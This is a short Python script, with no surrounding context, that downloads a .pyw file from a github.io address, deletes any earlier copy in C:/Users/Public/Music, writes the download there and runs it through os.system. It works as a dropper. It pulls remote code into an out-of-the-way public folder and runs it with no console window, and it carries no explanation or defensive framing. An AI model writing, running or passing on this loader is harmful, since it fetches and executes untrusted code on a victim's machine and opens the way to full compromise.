import os
import requests
import time
url = 'https://inoplanetanen.github.io/larisa.pyw'
r = requests.get(url, allow_redirects = True)
os.system('del C://Users//Public//Music//file.pyw')
open('C://Users//Public//Music//file.pyw', 'wb').write(r.content)
os.system('C://Users//Public//Music//file.pyw')
